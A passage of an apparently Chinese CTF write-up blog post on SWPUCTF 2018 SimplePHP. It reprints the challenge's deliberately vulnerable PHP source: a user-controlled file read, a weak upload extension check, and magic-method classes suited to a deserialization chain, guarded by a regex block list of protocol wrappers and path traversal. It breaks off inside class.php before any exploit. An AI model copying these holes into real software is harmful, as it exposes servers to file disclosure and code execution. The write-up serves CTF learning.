<!doctype html>
<html lang="zh-cn">
  <head>
    <title>SWPUCTF_2018_SimplePHP // main1o</title>
    <link rel="shortcut icon" href="ICON.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.152.2">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SWPUCTF_2018_SimplePHP">
  <meta name="twitter:description" content="[SWPUCTF 2018]SimplePHP 任意文件包含？
大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码
file.php
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php header(&#34;content-type:text/html;charset=utf-8&#34;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&#34;file&#34;] ? $_GET[&#39;file&#39;] : &#34;&#34;; if(empty($file)) { echo &#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt; function.php
文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 &lt;?php //show_source(__FILE__); include &#34;base.php&#34;; header(&#34;Content-type: text/html;charset=utf-8&#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&#34;file&#34;][&#34;name&#34;].$_SERVER[&#34;REMOTE_ADDR&#34;]).&#34;.jpg&#34;; //mkdir(&#34;upload&#34;,0777); if(file_exists(&#34;upload/&#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $filename); echo &#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&#34;gif&#34;,&#34;jpeg&#34;,&#34;jpg&#34;,&#34;png&#34;); $temp = explode(&#34;.&#34;,$_FILES[&#34;file&#34;][&#34;name&#34;]); $extension = end($temp); if(empty($extension)) { //echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo &#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;; return false; } } } ?&gt; base.php">

    <meta property="og:url" content="https://main1o.github.io/p/swpuctf_2018_simplephp/">
  <meta property="og:site_name" content="main1o">
  <meta property="og:title" content="SWPUCTF_2018_SimplePHP">
  <meta property="og:description" content="[SWPUCTF 2018]SimplePHP 任意文件包含？
大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码
file.php
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php header(&#34;content-type:text/html;charset=utf-8&#34;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&#34;file&#34;] ? $_GET[&#39;file&#39;] : &#34;&#34;; if(empty($file)) { echo &#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt; function.php
文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 &lt;?php //show_source(__FILE__); include &#34;base.php&#34;; header(&#34;Content-type: text/html;charset=utf-8&#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&#34;file&#34;][&#34;name&#34;].$_SERVER[&#34;REMOTE_ADDR&#34;]).&#34;.jpg&#34;; //mkdir(&#34;upload&#34;,0777); if(file_exists(&#34;upload/&#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $filename); echo &#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&#34;gif&#34;,&#34;jpeg&#34;,&#34;jpg&#34;,&#34;png&#34;); $temp = explode(&#34;.&#34;,$_FILES[&#34;file&#34;][&#34;name&#34;]); $extension = end($temp); if(empty($extension)) { //echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo &#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;; return false; } } } ?&gt; base.php">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2022-08-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-08-04T00:00:00+00:00">
    <meta property="article:tag" content="Php">
    <meta property="article:tag" content="Ctf">


  </head>
  <body>
    <header class="app-header">
      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
      <span class="app-header-title">main1o</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>荆棘之路</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">SWPUCTF_2018_SimplePHP</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Aug 4, 2022
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          3 min read
        </div>
        <div>
          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
              <a class="tag" href="/tags/php/">Php</a>
              <a class="tag" href="/tags/ctf/">Ctf</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</h1>
<p>任意文件包含？</p>
<p>大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码</p>
<p><img src="/p/swpuctf_2018_simplephp/image-20220804225839150.png" alt="image-20220804225839150"></p>
<p>file.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="c1">// 这里传的 $file 到 class.php文件中去形成文件读取了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>function.php</p>
<ul>
<li>文件</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="c1">//show_source(__FILE__); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="s2">&#34;base.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/html;charset=utf-8&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_do</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="c1">//mkdir(&#34;upload&#34;,0777); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">upload_file_check</span><span class="p">())</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">upload_file_do</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$extension</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span><span class="nv">$allowed_types</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>base.php</p>
<ul>
<li>前端展示</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;web3&lt;/title&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;nav class=&#34;navbar navbar-default&#34; role=&#34;navigation&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;container-fluid&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;navbar-header&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;首页&lt;/a&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbra-toggle&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li class=&#34;active&#34;&gt;&lt;a href=&#34;file.php?file=&#34;&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;upload_file.php&#34;&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbar-right&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;index.php&#34;&gt;&lt;span class=&#34;glyphicon glyphicon-user&#34;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/nav&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!--flag is in f1ag.php--&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>class.php</strong></p>
<ul>
<li>魔法方法出现最多的一个php文件</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
